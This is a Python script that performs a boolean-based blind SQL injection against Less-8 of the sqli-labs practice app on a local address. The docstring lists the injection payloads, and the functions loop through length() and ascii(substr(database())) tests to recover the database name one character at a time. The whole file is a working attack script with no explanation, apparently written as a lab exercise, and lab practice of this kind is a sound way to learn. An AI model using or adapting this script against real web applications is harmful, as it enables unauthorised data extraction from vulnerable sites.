#coding:utf-8

import requests
import string
import sys

'''
?id=1' and 1=2--+
?id=1' and length(database())=1--+
?id=1' and ascii(substr(database(),1,1))=1--+
'''

url = "http://192.168.139.133/sqli-labs/Less-8/index.php"
flag = "You are in...."

def getDbNameLen(url):
    for i in range(0,20):
        payload = "?id=1' and length(database())={}--+".format(i)
        fullUrl = url + payload

        print("[-] " + fullUrl ,end = '\r')
        
        # time.sleep(0.5)

        if flag in requests.get(fullUrl).text:
            print("\n" ,end = "")

            break

    return i


def getDbName(url):
    dbName = ""
    for i in range(1,dbNameLen + 1):
        for j in string.printable.strip():
            payload = "?id=1' and ascii(substr(database(),{},1))={}--+".format(i,ord(j))
            fullUrl = url + payload

            print("[-] " + fullUrl ,end = '\r')

            # time.sleep(0.1)

            if flag in requests.get(fullUrl).text:
                dbName += j
                print("\n" ,end = "")

                break

    return dbName

dbNameLen = getDbNameLen(url)
print("\n\033[32m[+] The dbName length is {}\n\033[0m".format(dbNameLen))

dbName = getDbName(url)
print("\n\033[32m[+] The dbName is {}\033[0m".format(dbName))